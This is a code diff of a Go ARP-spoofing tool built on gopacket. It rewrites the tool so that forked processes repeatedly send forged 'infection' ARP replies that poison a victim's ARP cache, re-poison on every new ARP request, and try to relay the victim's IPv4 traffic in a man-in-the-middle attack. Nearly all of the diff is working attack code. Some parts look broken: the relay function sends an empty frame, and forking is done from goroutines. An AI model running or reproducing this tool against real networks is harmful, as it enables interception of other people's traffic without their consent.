@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"syscall"
 	"time"
 
 	"github.com/google/gopacket"
@@ -70,45 +71,10 @@ func buildNormalARPRequest(ip net.IP) []byte {
 	return buf.Bytes()
 }
 
-func resolve(handle *pcap.Handle, index int) {
-	normalARPRequest := buildNormalARPRequest(senderIPs[index])
-	if err := handle.WritePacketData(normalARPRequest); err != nil {
-		panic("Error sending packet to network device")
-	} else {
-		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-		for packet := range packetSource.Packets() {
-			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
-				arp, _ := arpLayer.(*layers.ARP)
-				if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
-					senderMAC = arp.SourceHwAddress
-					break
-				}
-			}
-		}
-	}
-	fmt.Printf("[+] Successfully got MAC address of %s\n", senderIPs[index])
-	normalARPRequest = buildNormalARPRequest(targetIPs[index])
-	if err := handle.WritePacketData(normalARPRequest); err != nil {
-		panic("Error sending packet to network device")
-	} else {
-		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-		for packet := range packetSource.Packets() {
-			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
-				arp, _ := arpLayer.(*layers.ARP)
-				if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
-					targetMAC = arp.SourceHwAddress
-					break
-				}
-			}
-		}
-	}
-	fmt.Printf("[+] Successfully got MAC address of %s\n", targetIPs[index])
-}
-
-func buildInfectionARPReply(mac net.HardwareAddr, srcIP net.IP, dstIP net.IP) []byte {
+func buildInfectionARPReply(index int) []byte {
 	ethLayer := &layers.Ethernet{
 		SrcMAC:       attackerMAC,
-		DstMAC:       mac,
+		DstMAC:       senderMAC,
 		EthernetType: layers.EthernetTypeARP,
 	}
 	arpLayer := &layers.ARP{
@@ -118,9 +84,9 @@ func buildInfectionARPReply(mac net.HardwareAddr, srcIP net.IP, dstIP net.IP) []
 		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
 		SourceHwAddress:   attackerMAC,
-		SourceProtAddress: srcIP.To4(),
-		DstHwAddress:      mac,
-		DstProtAddress:    dstIP.To4(),
+		SourceProtAddress: targetIPs[index].To4(),
+		DstHwAddress:      senderMAC,
+		DstProtAddress:    senderIPs[index].To4(),
 	}
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{}
@@ -131,18 +97,113 @@ func buildInfectionARPReply(mac net.HardwareAddr, srcIP net.IP, dstIP net.IP) []
 	return buf.Bytes()
 }
 
-func poison(handle *pcap.Handle, index int) {
-	infectionARPReply := buildInfectionARPReply(senderMAC, targetIPs[index], senderIPs[index])
-	if err := handle.WritePacketData(infectionARPReply); err != nil {
-		panic("Error sending packet to network device")
-	} else {
-		fmt.Printf("[+] Successfully poisoned sender's ARP cache\n")
+func buildRelayPacket() []byte {
+	ethLayer := &layers.Ethernet{
+		SrcMAC:       attackerMAC,
+		DstMAC:       targetMAC,
+		EthernetType: layers.EthernetTypeARP,
 	}
-	infectionARPReply = buildInfectionARPReply(targetMAC, senderIPs[index], targetIPs[index])
-	if err := handle.WritePacketData(infectionARPReply); err != nil {
-		panic("Error sending packet to network device")
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{}
+	gopacket.SerializeLayers(buf, opts, ethLayer)
+	return buf.Bytes()
+}
+
+func poison(handle *pcap.Handle, index int) {
+	if pid, _, err := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0); err != 0 {
+		panic("Failed to fork")
 	} else {
-		fmt.Printf("[+] Successfully poisoned target's ARP cache\n")
+		if pid == 0 {
+			for {
+				infectionARPReply := buildInfectionARPReply(index)
+				if err := handle.WritePacketData(infectionARPReply); err != nil {
+					panic("Error sending packet to network device")
+				} else {
+					fmt.Printf("[+] Successfully poisoned sender's ARP cache\n")
+				}
+				time.Sleep(time.Second * 10)
+			}
+		} else if pid > 0 {
+			packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+			for packet := range packetSource.Packets() {
+				if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
+					eth, _ := ethLayer.(*layers.Ethernet)
+					if string(eth.SrcMAC) == string(senderMAC) {
+						if eth.EthernetType == layers.EthernetTypeARP {
+							arpLayer := packet.Layer(layers.LayerTypeARP)
+							arp, _ := arpLayer.(*layers.ARP)
+							if arp.Operation == layers.ARPRequest && string(arp.DstProtAddress) == string(targetIPs[index]) {
+								infectionARPReply := buildInfectionARPReply(index)
+								if err := handle.WritePacketData(infectionARPReply); err != nil {
+									panic("Error sending packet to network device")
+								} else {
+									fmt.Printf("[+] Successfully re-poisoned sender's ARP cache\n")
+								}
+							}
+						} else if eth.EthernetType == layers.EthernetTypeIPv4 {
+							ipLayer := packet.Layer(layers.LayerTypeIPv4)
+							ip, _ := ipLayer.(*layers.IPv4)
+							if string(ip.SrcIP) == string(senderIPs[index]) {
+								relay := buildRelayPacket()
+								if err := handle.WritePacketData(relay); err != nil {
+									panic("Error sending packet to network device")
+								} else {
+									fmt.Printf("[+] Successfully relayed packet to target\n")
+								}
+							}
+						} else {
+							continue
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+func spoof(handle *pcap.Handle, index int) {
+	if pid, _, err := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0); err != 0 {
+		panic("Failed to fork")
+	} else {
+		if pid == 0 {
+			normalARPRequest := buildNormalARPRequest(senderIPs[index])
+			if err := handle.WritePacketData(normalARPRequest); err != nil {
+				panic("Error sending packet to network device")
+			} else {
+				packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+				for packet := range packetSource.Packets() {
+					if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
+						arp, _ := arpLayer.(*layers.ARP)
+						if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
+							senderMAC = arp.SourceHwAddress
+							break
+						}
+					}
+				}
+			}
+			fmt.Printf("[+] Successfully got MAC address of %s\n", senderIPs[index])
+
+			normalARPRequest = buildNormalARPRequest(targetIPs[index])
+			if err := handle.WritePacketData(normalARPRequest); err != nil {
+				panic("Error sending packet to network device")
+			} else {
+				packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+				for packet := range packetSource.Packets() {
+					if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
+						arp, _ := arpLayer.(*layers.ARP)
+						if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
+							targetMAC = arp.SourceHwAddress
+							break
+						}
+					}
+				}
+			}
+			fmt.Printf("[+] Successfully got MAC address of %s\n", targetIPs[index])
+
+			fmt.Printf("senderMAC: %s\n", senderMAC) // !debug
+			fmt.Printf("targetMAC: %s\n", targetMAC) // !debug
+			poison(handle, index)
+		}
 	}
 }
 
@@ -183,11 +244,7 @@ func main() {
 		panic(err)
 	} else {
 		for i := range len(senderIPs) {
-			resolve(handle, i)
-			fmt.Printf("senderMAC: %s\n", senderMAC) // !debug
-			fmt.Printf("targetMAC: %s\n", targetMAC) // !debug
-			poison(handle, i)
-			// !todo relay
+			go spoof(handle, i)
 		}
 	}
 }
